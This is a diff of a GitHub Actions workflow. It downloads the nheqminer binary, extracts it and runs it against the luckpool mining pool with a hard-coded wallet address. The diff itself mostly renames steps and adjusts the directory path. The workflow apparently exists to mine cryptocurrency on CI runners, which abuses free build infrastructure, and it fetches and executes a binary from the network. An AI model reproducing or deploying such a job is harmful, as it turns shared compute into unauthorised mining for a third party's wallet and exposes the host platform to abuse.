@@ -20,16 +20,19 @@ jobs:
         run: |
           wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 
-      - name: Extract files
+      - name: Extract nheqminer
         run: |
           tar -xvf nheqminer-Linux-v0.8.2.tgz
 
-      - name: List files
+      - name: List extracted files
         run: |
           ls -l  # List files in the current directory
-          # If nheqminer is inside another directory, you might need to adjust the path here
+
+      - name: List files in nheqminer directory
+        run: |
+          ls -l nheqminer*  # List files in the extracted directory
 
       - name: Run nheqminer
         run: |
-          cd nheqminer  # Adjust this path if necessary
+          cd nheqminer*  # Change to the correct directory
           ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
